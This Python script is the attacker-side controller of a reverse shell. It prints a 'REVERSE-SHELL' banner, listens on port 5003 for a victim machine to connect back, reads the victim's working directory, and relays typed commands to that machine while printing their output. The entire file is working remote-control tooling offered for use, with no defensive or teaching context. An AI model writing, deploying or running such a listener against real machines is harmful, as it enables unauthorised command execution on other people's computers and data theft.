import socket
print("""

█▀█ █▀▀ █░█ █▀▀ █▀█ █▀ █▀▀ ▄▄ █▀ █░█ █▀▀ █░░ █░░
█▀▄ ██▄ ▀▄▀ ██▄ █▀▄ ▄█ ██▄ ░░ ▄█ █▀█ ██▄ █▄▄ █▄▄

------------------version 1.0----------------

[+] CREATED BY SOLOMON ADENUGA \n
""")

SERVER_HOST = "0.0.0.0"
SERVER_PORT = 5003
BUFFER_SIZE = 1024 * 128 # max size of message: 128kb, you can edit this
SEPARATOR = "<sep>" #for sending two messages at the same time

s = socket.socket()
s.bind((SERVER_HOST, SERVER_PORT))
s.listen(5)
print(f"\033[92m`  [+] LISTENING AS {SERVER_HOST}: {SERVER_PORT}")
print("\033[92m` ")
client_socket, client_address = s.accept()
print("\n")
print(f"\033[92m`  [✓] {client_address[0]}:{client_address[1]} Connected!")
print("\033[92m` ")
cwd = client_socket.recv(BUFFER_SIZE).decode() #get currebt working directory of client
print("\n")
print(f"\033[92m`  [+] CURRENT WORKING DIRECTORY: {cwd}")
print("\033[92m` ")
while True:
	command = input(f"\n \033[92m`  {cwd} $>")
	print("\033[92m` ")
	if not command.strip():
		continue
	client_socket.send(command.encode())
	if command.lower() == "exit":
		break
		
	output = client_socket.recv(BUFFER_SIZE).decode()
	results, cwd = output.split(SEPARATOR)
	print(results)